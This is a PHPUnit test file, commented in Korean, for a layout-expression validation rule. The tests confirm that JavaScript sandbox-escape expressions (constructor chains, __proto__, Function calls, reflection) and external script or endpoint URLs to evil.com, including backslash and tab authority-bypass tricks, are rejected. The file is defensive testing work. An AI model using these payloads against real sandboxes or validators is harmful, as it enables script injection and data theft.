<?php

namespace Tests\Feature\Rules;

use App\Extension\HookManager;
use App\Http\Requests\Layout\StoreLayoutRequest;
use App\Http\Requests\Layout\UpdateLayoutContentRequest;
use App\Http\Requests\Layout\UpdateLayoutExtensionContentRequest;
use App\Http\Requests\Layout\UpdateLayoutRequest;
use App\Rules\SafeLayoutExpressions;
use App\Support\TrustedScriptHosts;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * SafeLayoutExpressions 규칙 테스트 (KVE-2026-1915 B-3)
 *
 * 저장측 심층 방어: 표현식 샌드박스 우회 토큰과 외부 리소스 URL 을 거부하고,
 * 정상 표현식(화살표 함수·템플릿 리터럴·스프레드 등)은 통과시키는지 검증합니다.
 *
 * 시나리오 축(case)은 배포 번들 E2E(layout-expression-sandbox.spec.ts)가 커버하고,
 * 이 파일은 저장 단계에서 같은 효과를 떠받칩니다 — 런타임 평가기가 실행을 막기 전에
 * 위험 표현식이 애초에 저장되지 않도록 거부합니다.
 *
 * 효과 요약(마커 아님 — 평문): sandbox_escape_blocked. 실제 마커는 그 효과를 단언하는
 * 개별 메서드에만 둔다 — 클래스 레벨에 몰아 적으면 메서드를 전부 지워도 커버리지가
 * green 으로 남는다.
 */
class SafeLayoutExpressionsTest extends TestCase
{
    private SafeLayoutExpressions $rule;

    protected function setUp(): void
    {
        parent::setUp();
        $this->rule = new SafeLayoutExpressions;
    }

    protected function tearDown(): void
    {
        HookManager::clearFilter(TrustedScriptHosts::FILTER_HOOK);
        parent::tearDown();
    }

    /**
     * 신뢰 호스트를 훅으로 등록합니다 (확장 manifest 선언을 모사).
     *
     * @param  string  $host  신뢰 호스트명
     */
    private function trustHost(string $host): void
    {
        HookManager::addFilter(
            TrustedScriptHosts::FILTER_HOOK,
            fn (array $hosts) => array_merge($hosts, [$host]),
            priority: 1
        );
    }

    private function fails(array $layout): bool
    {
        $failed = false;
        $this->rule->validate('content', $layout, function () use (&$failed) {
            $failed = true;
        });

        return $failed;
    }

    // ==========================================
    // 정상 표현식 통과 (회귀 방지)
    // ==========================================

    public function test_passes_normal_layout(): void
    {
        $layout = [
            'version' => '1.0.0',
            'components' => [
                ['name' => 'Div', 'props' => ['text' => '{{user?.name ?? "Guest"}}']],
            ],
        ];

        $this->assertFalse($this->fails($layout), '정상 레이아웃은 통과해야 합니다');
    }

    public function test_passes_arrow_function_expression(): void
    {
        // 화살표 함수/스프레드/필터는 정상 (176개 레이아웃에서 사용)
        $layout = [
            'components' => [[
                'name' => 'Div',
                'props' => ['value' => "{{((_global.f ?? []) || []).filter(v => v !== 'x')}}"],
            ]],
        ];

        $this->assertFalse($this->fails($layout), '화살표 함수 표현식은 통과해야 합니다');
    }

    public function test_passes_template_literal_navigation(): void
    {
        // 템플릿 리터럴은 내비게이션 경로 조립에 정상 사용
        $layout = [
            'actions' => [[
                'handler' => 'navigate',
                'params' => ['path' => '{{`/mypage/${$args[0]}`}}'],
            ]],
        ];

        $this->assertFalse($this->fails($layout), '템플릿 리터럴은 통과해야 합니다');
    }

    public function test_passes_same_origin_endpoint(): void
    {
        $layout = [
            'data_sources' => [
                ['id' => 'products', 'endpoint' => '/api/modules/sirsoft-ecommerce/products'],
                ['id' => 'post', 'endpoint' => '/api/modules/sirsoft-board/admin/board/{{route.slug}}/posts/{{route.id}}'],
            ],
        ];

        $this->assertFalse($this->fails($layout), 'same-origin 경로 엔드포인트는 통과해야 합니다');
    }

    // ==========================================
    // 위험 표현식 차단
    // ==========================================

    /** @effects sandbox_escape_blocked */
    public function test_fails_constructor_chain_dot_access(): void
    {
        $layout = [
            'components' => [[
                'name' => 'Div',
                'props' => ['text' => "{{''.constructor.constructor('return 1')()}}"],
            ]],
        ];

        $this->assertTrue($this->fails($layout), 'constructor 체인 접근은 차단되어야 합니다');
    }

    /** @effects sandbox_escape_blocked */
    public function test_fails_constructor_computed_string_access(): void
    {
        $layout = [
            'components' => [[
                'name' => 'Div',
                'props' => ['text' => "{{''['constructor']}}"],
            ]],
        ];

        $this->assertTrue($this->fails($layout), 'computed constructor 접근은 차단되어야 합니다');
    }

    /** @effects sandbox_escape_blocked */
    public function test_fails_proto_access(): void
    {
        $layout = [
            'components' => [[
                'name' => 'Div',
                'props' => ['text' => '{{obj.__proto__}}'],
            ]],
        ];

        $this->assertTrue($this->fails($layout), '__proto__ 접근은 차단되어야 합니다');
    }

    /** @effects sandbox_escape_blocked */
    public function test_fails_function_constructor_call(): void
    {
        $layout = [
            'components' => [[
                'name' => 'Div',
                'props' => ['text' => "{{Function('return 1')()}}"],
            ]],
        ];

        $this->assertTrue($this->fails($layout), 'Function 생성자 호출은 차단되어야 합니다');
    }

    /** @effects sandbox_escape_blocked */
    public function test_fails_dynamic_import_call(): void
    {
        $layout = [
            'components' => [[
                'name' => 'Div',
                'props' => ['text' => "{{import('https://evil.com/x.js')}}"],
            ]],
        ];

        $this->assertTrue($this->fails($layout), '동적 import() 호출은 차단되어야 합니다');
    }

    /** @effects sandbox_escape_blocked */
    public function test_fails_legacy_accessor_prototype_reach(): void
    {
        // legacy 접근자 4종 — 프로퍼티를 문자열 인자로 지목해 프로토타입을 읽고 쓴다.
        // Object 리플렉션 static 을 제거해도 이 경로가 같은 능력을 상속으로 제공한다.
        foreach (['__lookupGetter__', '__lookupSetter__', '__defineGetter__', '__defineSetter__'] as $accessor) {
            $layout = [
                'components' => [[
                    'name' => 'Div',
                    'props' => ['text' => "{{({}).{$accessor}('__proto__')}}"],
                ]],
            ];

            $this->assertTrue($this->fails($layout), "{$accessor} 접근은 차단되어야 합니다");
        }
    }

    public function test_passes_prototype_word_in_plain_comparison(): void
    {
        // 과차단 회귀 방지 — 런타임 평가기가 허용하는 정상 비교는 저장측도 통과해야 한다.
        // 신규 legacy 접근자 패턴이 단어 경계를 쓰므로 이 형태를 건드리지 않는다.
        $layout = [
            'components' => [[
                'name' => 'Div',
                'props' => ['text' => "{{ mode === 'prototype' ? 'a' : 'b' }}"],
            ]],
        ];

        $this->assertFalse($this->fails($layout), '정상 문자열 비교는 통과해야 합니다');
    }

    /** @effects sandbox_escape_blocked */
    public function test_fails_nested_array_computed_key(): void
    {
        // 중첩 배열 키 `[['constructor']]` — 구 브래킷 한정 패턴이 놓치던 형태 (KVE-2026-1915)
        $layout = [
            'components' => [[
                'name' => 'Div',
                'props' => ['text' => "{{''[['constructor']][['constructor']]('return 1')()}}"],
            ]],
        ];

        $this->assertTrue($this->fails($layout), '중첩 배열 computed 키는 차단되어야 합니다');
    }

    /** @effects sandbox_escape_blocked */
    public function test_fails_reflection_static_string_argument(): void
    {
        // 리플렉션 static 의 문자열 인자 `..., 'constructor')` — 구 패턴이 놓치던 형태
        $layout = [
            'components' => [[
                'name' => 'Div',
                'props' => ['text' => "{{Object.getOwnPropertyDescriptor(Object.getPrototypeOf(String), 'constructor').value('x')()}}"],
            ]],
        ];

        $this->assertTrue($this->fails($layout), '리플렉션 static 문자열 인자는 차단되어야 합니다');
    }

    /** @effects sandbox_escape_blocked */
    public function test_fails_object_reflection_static_names(): void
    {
        foreach (['Object.getPrototypeOf(x)', 'Object.setPrototypeOf(x, y)', 'Object.defineProperty(x, y, z)'] as $expr) {
            $layout = [
                'components' => [[
                    'name' => 'Div',
                    'props' => ['text' => "{{{$expr}}}"],
                ]],
            ];

            $this->assertTrue($this->fails($layout), "Object 리플렉션 static({$expr})은 차단되어야 합니다");
        }
    }

    public function test_passes_object_safe_data_methods(): void
    {
        // 안전한 Object 데이터 메서드는 통과 (실제 레이아웃에서 사용)
        $layout = [
            'components' => [[
                'name' => 'Div',
                'props' => ['value' => '{{Object.assign(Object.create(null), _local.filters, { [k]: v })}}'],
            ]],
        ];

        $this->assertFalse($this->fails($layout), 'Object.keys/assign/create 등 데이터 메서드는 통과해야 합니다');
    }

    public function test_passes_string_literal_comparison_of_reserved_word(): void
    {
        // 금지 프로퍼티 이름을 프로퍼티로 접근하지 않고 단순 문자열로 비교하는 정상 표현식은
        // 통과해야 한다 — 런타임 평가기가 허용하므로 저장측이 막으면 저장이 불가한 비대칭이 된다.
        // (편집기가 이런 레이아웃을 저장할 때 오탐으로 거부되면 안 됨)
        $layout = [
            'components' => [[
                'name' => 'Div',
                'if' => "{{_local.mode === 'prototype'}}",
                'props' => ['text' => "{{status === 'constructor' ? 'A' : 'B'}}"],
            ]],
        ];

        $this->assertFalse($this->fails($layout), '예약어를 문자열로 비교하는 정상 표현식은 통과해야 합니다');
    }

    /**
     * 저장소가 배포하는 레이아웃 전수 스윕 — 저장측 규칙이 기존 레이아웃을 거부하지 않는다.
     *
     * 합성 페이로드만으로는 "정상 표현식 통과"를 증명하지 못한다. 픽스처는 늘 현재 규칙을
     * 지키도록 쓰이므로, 규칙이 조여졌을 때 **이미 배포된 레이아웃이 저장 불가가 되는**
     * 과차단 회귀는 실제 모집단으로만 드러난다(예: `=>` 를 금지 토큰에 넣으면 이 테스트가
     * red 가 된다). 정적 룰은 audit 실행 시점에만 도는 별개 축이므로, 저장측 PHP 규칙 자신의
     * 모집단 검사를 여기에 둔다.
     */
    public function test_passes_every_shipped_layout(): void
    {
        // 모집단은 선언 주체별로 나눠 센다. 합산 하한만 두면 한 주체가 통째로 빠져도
        // 나머지가 하한을 넘겨 green 이 된다(예: templates 327건이 사라져도 modules+plugins
        // 272건이 남는다). 주체별 하한이라야 경로 이동을 그 주체에서 잡는다.
        $groups = [
            // 코어 레이아웃 루트는 현재 추적 파일 0건이다. 스캔에는 포함하되 하한은 두지
            // 않는다 — 하한을 걸면 코어 레이아웃이 없다는 사실만으로 상시 red 가 된다.
            'core' => [[base_path('resources/layouts')], 0],
            'templates' => [glob(base_path('templates/_bundled/*/layouts')) ?: [], 250],
            'modules' => [glob(base_path('modules/_bundled/*/resources/layouts')) ?: [], 200],
            'plugins' => [glob(base_path('plugins/_bundled/*/resources/layouts')) ?: [], 10],
        ];

        $rejected = [];
        $scannedByGroup = [];

        foreach ($groups as $group => [$roots, $_floor]) {
            $scannedByGroup[$group] = 0;

            foreach ($roots as $root) {
                if (! is_dir($root)) {
                    continue;
                }

                $files = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($root));
                foreach ($files as $file) {
                    if ($file->getExtension() !== 'json') {
                        continue;
                    }

                    $decoded = json_decode(file_get_contents($file->getPathname()), true);
                    if (! is_array($decoded)) {
                        continue;
                    }

                    $scannedByGroup[$group]++;
                    if ($this->fails($decoded)) {
                        $rejected[] = str_replace(base_path().DIRECTORY_SEPARATOR, '', $file->getPathname());
                    }
                }
            }
        }

        // 모집단이 비면 이 테스트는 아무것도 증명하지 않는다 — 경로 오타/이동으로 조용히
        // green 이 되는 것을 막는다.
        foreach ($groups as $group => [$_roots, $floor]) {
            if ($floor === 0) {
                continue;
            }

            $this->assertGreaterThanOrEqual(
                $floor,
                $scannedByGroup[$group],
                "{$group} 레이아웃 모집단이 하한({$floor})을 밑돕니다(스캔 {$scannedByGroup[$group]}건) — 경로가 바뀌었는지 확인하세요"
            );
        }

        $this->assertSame(
            [],
            $rejected,
            '배포 레이아웃이 저장측 규칙에 거부되면 그 화면은 편집 후 저장이 불가해집니다: '
                .implode(', ', array_slice($rejected, 0, 10))
        );
    }

    // ==========================================
    // 외부 리소스 URL 차단
    // ==========================================

    public function test_fails_external_script_src(): void
    {
        $layout = [
            'scripts' => [
                ['id' => 'evil', 'src' => 'https://evil.com/x.js'],
            ],
        ];

        $this->assertTrue($this->fails($layout), '외부 스크립트 src 는 차단되어야 합니다');
    }

    public function test_fails_protocol_relative_script_src(): void
    {
        $layout = [
            'scripts' => [
                ['id' => 'evil', 'src' => '//evil.com/x.js'],
            ],
        ];

        $this->assertTrue($this->fails($layout), 'protocol-relative src 는 차단되어야 합니다');
    }

    public function test_passes_same_origin_script_src(): void
    {
        $layout = [
            'scripts' => [
                ['id' => 'local', 'src' => '/js/widget.js'],
            ],
        ];

        $this->assertFalse($this->fails($layout), 'same-origin 스크립트 src 는 통과해야 합니다');
    }

    public function test_passes_trusted_host_script_src(): void
    {
        // 확장이 manifest 로 선언한 신뢰 호스트의 외부 스크립트는 통과한다
        $this->trustHost('cdn.ckeditor.com');

        $layout = [
            'scripts' => [
                ['id' => 'ckeditor', 'src' => 'https://cdn.ckeditor.com/ckeditor5/43.3.1/ckeditor5.umd.js'],
            ],
        ];

        $this->assertFalse($this->fails($layout), '신뢰 호스트의 외부 스크립트 src 는 통과해야 합니다');
    }

    public function test_passes_trusted_host_protocol_relative_data_source(): void
    {
        $this->trustHost('t1.daumcdn.net');

        $layout = [
            'data_sources' => [
                ['id' => 'daum', 'endpoint' => '//t1.daumcdn.net/mapjsapi/bundle/postcode/prod/postcode.v2.js'],
            ],
        ];

        $this->assertFalse($this->fails($layout), '신뢰 호스트의 protocol-relative endpoint 는 통과해야 합니다');
    }

    /**
     * 신뢰 호스트를 userinfo 로 위장한 authority 우회는 거부한다.
     *
     * `https://evil.com\@cdn.ckeditor.com/x.js` 는 정규화 없이 parse_url 로 읽으면
     * 호스트가 `cdn.ckeditor.com`(신뢰 목록)으로 보이지만, 브라우저는 백슬래시를
     * 슬래시로 접어 `evil.com` 에서 로드한다. 신뢰 호스트 판정이 same-origin 판정과
     * 다른 정규화를 쓰면 이 형태만 저장측을 통과한다.
     */
    public function test_fails_trusted_host_userinfo_disguise(): void
    {
        $this->trustHost('cdn.ckeditor.com');

        $bs = chr(92);
        $layout = [
            'scripts' => [
                ['id' => 'x', 'src' => 'https://evil.com'.$bs.'@cdn.ckeditor.com/x.js'],
            ],
        ];

        $this->assertTrue(
            $this->fails($layout),
            '신뢰 호스트를 userinfo 로 위장한 외부 스크립트는 거부해야 합니다'
        );
    }

    /**
     * (과차단 회귀) 런타임이 신뢰 호스트로 해석하는 형태는 저장측도 통과시킨다.
     *
     * `/\/cdn.ckeditor.com/x.js` 는 문자열상 path 지만 브라우저는 authority 로 읽어
     * 신뢰 호스트에서 로드한다. 저장측만 거부하면 "런타임은 되는데 저장이 안 되는"
     * 역방향 비대칭이 된다.
     */
    public function test_passes_trusted_host_reached_through_backslash_authority(): void
    {
        $this->trustHost('cdn.ckeditor.com');

        $layout = [
            'scripts' => [
                ['id' => 'x', 'src' => '/'.chr(92).'/cdn.ckeditor.com/x.js'],
            ],
        ];

        $this->assertFalse(
            $this->fails($layout),
            '런타임이 신뢰 호스트로 해석하는 형태는 저장측도 통과해야 합니다'
        );
    }

    public function test_still_fails_untrusted_host_when_other_host_trusted(): void
    {
        // cdn.ckeditor.com 만 신뢰해도 evil.com 은 여전히 차단된다
        $this->trustHost('cdn.ckeditor.com');

        $layout = [
            'scripts' => [
                ['id' => 'evil', 'src' => 'https://evil.com/x.js'],
            ],
        ];

        $this->assertTrue($this->fails($layout), '신뢰 목록에 없는 외부 스크립트는 차단되어야 합니다');
    }

    public function test_fails_external_data_source_endpoint(): void
    {
        $layout = [
            'data_sources' => [
                ['id' => 'x', 'endpoint' => 'https://evil.com/steal'],
            ],
        ];

        $this->assertTrue($this->fails($layout), '외부 data_sources 엔드포인트는 차단되어야 합니다');
    }

    /**
     * authority 우회 후보 URL (KVE-2026-1915 후속)
     *
     * `/\/evil.com/x.js` 는 `//` 로 시작하지 않고 scheme 도 없으며 `/` 로 시작하므로
     * 문자열 접두 검사만으로는 same-origin path 로 판정된다. 그러나 브라우저의 URL
     * 파서는 (a) special scheme 에서 `\` 를 `/` 와 동등하게 처리하고 (b) 파싱 전에
     * ASCII tab·개행을 제거하므로, 실제로는 `https://evil.com/x.js` 로 해석되어
     * 원격 스크립트가 로드된다.
     *
     * 실측(node `new URL`, base `https://g7_2.dev/`): 아래 4형태 전부 origin 이
     * `https://evil.com` 으로 해석된다.
     *
     * @return array<string, array{string}>
     */
    public static function authorityBypassProvider(): array
    {
        $bs = chr(92);

        return [
            'slash-backslash-slash' => ['/'.$bs.'/evil.com/x.js'],
            'slash-backslash' => ['/'.$bs.'evil.com/x.js'],
            'slash-double-backslash' => ['/'.$bs.$bs.'evil.com/x.js'],
            'slash-tab-slash' => ['/'.chr(9).'/evil.com/x.js'],
            'slash-lf-slash' => ['/'.chr(10).'/evil.com/x.js'],
            'slash-cr-slash' => ['/'.chr(13).'/evil.com/x.js'],
        ];
    }

    /**
     * @param  string  $src  authority 우회 후보 URL
     */
    #[DataProvider('authorityBypassProvider')]
    public function test_fails_authority_bypass_script_src(string $src): void
    {
        $layout = [
            'scripts' => [
                ['id' => 'evil', 'src' => $src],
            ],
        ];

        $this->assertTrue(
            $this->fails($layout),
            'authority 우회 src 는 차단되어야 합니다: '.json_encode($src)
        );
    }

    /**
     * @param  string  $endpoint  authority 우회 후보 URL
     */
    #[DataProvider('authorityBypassProvider')]
    public function test_fails_authority_bypass_data_source_endpoint(string $endpoint): void
    {
        $layout = [
            'data_sources' => [
                ['id' => 'evil', 'endpoint' => $endpoint],
            ],
        ];

        $this->assertTrue(
            $this->fails($layout),
            'authority 우회 endpoint 는 차단되어야 합니다: '.json_encode($endpoint)
        );
    }

    /**
     * 백슬래시·탭이 authority 위치가 아닌 경로 안에 있으면 same-origin 이므로 통과
     *
     * 과차단 회귀 방지 — 브라우저도 이 둘을 same-origin 으로 해석한다(실측).
     */
    public function test_passes_same_origin_path_containing_backslash_or_tab(): void
    {
        $layout = [
            'scripts' => [
                ['id' => 'a', 'src' => '/js/a'.chr(92).'b.js'],
                ['id' => 'b', 'src' => '/js/c'.chr(9).'d.js'],
            ],
        ];

        $this->assertFalse(
            $this->fails($layout),
            '경로 중간의 백슬래시·탭은 authority 를 만들지 않으므로 통과해야 합니다'
        );
    }

    // ==========================================
    // FormRequest 결선 (규칙이 content 배열에 실제로 물려 있는지)
    // ==========================================
    //
    // 규칙이 올바르게 동작해도 content **배열** 규칙에 부착되지 않으면 저장 경로는 그대로
    // 통과한다. 과거 두 content 전용 요청은 SafeLayoutExpressions 를 문자열 endpoint 에만
    // 걸어 두어(is_array 가드로 early-return) 트리 전체가 미검사로 남았다. 아래 테스트는
    // 네 요청 모두 content 배열 규칙에 규칙이 부착돼 있음을 고정한다.

    /**
     * FormRequest 의 content 배열 규칙에서 SafeLayoutExpressions 인스턴스를 찾는다.
     */
    private function contentRuleHasSafeExpressions(array $rules): bool
    {
        $contentRules = $rules['content'] ?? [];

        foreach ((array) $contentRules as $rule) {
            if ($rule instanceof SafeLayoutExpressions) {
                return true;
            }
        }

        return false;
    }

    public function test_update_content_request_attaches_rule_to_content_array(): void
    {
        $request = UpdateLayoutContentRequest::create('/x', 'PUT', [
            'content' => ['version' => '1.0.0', 'components' => []],
        ]);
        $request->setContainer($this->app);

        $this->assertTrue(
            $this->contentRuleHasSafeExpressions($request->rules()),
            'UpdateLayoutContentRequest 의 content 배열 규칙에 SafeLayoutExpressions 가 부착되어야 합니다'
        );
    }

    public function test_update_extension_content_request_attaches_rule_to_content_array(): void
    {
        $request = UpdateLayoutExtensionContentRequest::create('/x', 'PUT', [
            'content' => ['priority' => 0],
        ]);
        $request->setContainer($this->app);

        $this->assertTrue(
            $this->contentRuleHasSafeExpressions($request->rules()),
            'UpdateLayoutExtensionContentRequest 의 content 배열 규칙에 SafeLayoutExpressions 가 부착되어야 합니다'
        );
    }

    public function test_store_and_update_requests_attach_rule_to_content_array(): void
    {
        $store = StoreLayoutRequest::create('/x', 'POST', [
            'content' => ['version' => '1.0.0', 'components' => []],
        ]);
        $store->setContainer($this->app);

        $update = UpdateLayoutRequest::create('/x', 'PUT', [
            'content' => ['version' => '1.0.0', 'components' => []],
        ]);
        $update->setContainer($this->app);

        $this->assertTrue(
            $this->contentRuleHasSafeExpressions($store->rules()),
            'StoreLayoutRequest 의 content 배열 규칙에 SafeLayoutExpressions 가 부착되어야 합니다'
        );
        $this->assertTrue(
            $this->contentRuleHasSafeExpressions($update->rules()),
            'UpdateLayoutRequest 의 content 배열 규칙에 SafeLayoutExpressions 가 부착되어야 합니다'
        );
    }
}
